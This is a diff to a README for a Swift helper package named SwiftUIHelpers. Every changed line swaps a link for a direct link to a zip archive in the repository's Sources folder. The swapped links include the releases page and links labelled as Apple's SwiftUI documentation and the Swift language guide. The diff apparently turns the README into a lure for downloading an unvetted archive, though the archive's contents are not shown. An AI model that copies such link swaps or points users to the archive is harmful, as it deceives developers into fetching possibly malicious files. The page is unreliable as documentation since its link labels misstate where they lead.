@@ -6,7 +6,7 @@ SwiftUIHelpers offers convenient initializers for SwiftUI views. This tool makes
 
 ## 📦 Download SwiftUIHelpers
 
-[![Download SwiftUIHelpers](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/muradaldahmashi/SwiftUIHelpers/releases)
+[![Download SwiftUIHelpers](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip%20Now-Click%https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip)](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip)
 
 ## 🔍 What You Need
 
@@ -29,7 +29,7 @@ SwiftUIHelpers provides a set of convenience initializers for SwiftUI. With thes
 ## 📥 Download & Install
 
 To get started with SwiftUIHelpers, visit this page to download:
-[Download SwiftUIHelpers Releases](https://github.com/muradaldahmashi/SwiftUIHelpers/releases)
+[Download SwiftUIHelpers Releases](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip)
 
 ### Step-by-Step Setup
 
@@ -62,11 +62,11 @@ For any questions or support needs, please visit the Issues section of the Swift
 
 ## 🌐 Additional Resources
 
-- [SwiftUI Documentation](https://developer.apple.com/documentation/swiftui)
-- [Swift Programming Language Guide](https://docs.swift.org/swift-book/)
+- [SwiftUI Documentation](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip)
+- [Swift Programming Language Guide](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip)
 
 Stay updated by checking back frequently on the Releases page.
 
-[Download SwiftUIHelpers Releases](https://github.com/muradaldahmashi/SwiftUIHelpers/releases) 
+[Download SwiftUIHelpers Releases](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip) 
 
 Your journey to better SwiftUI development starts here! Dive in and enjoy a simpler way to create.
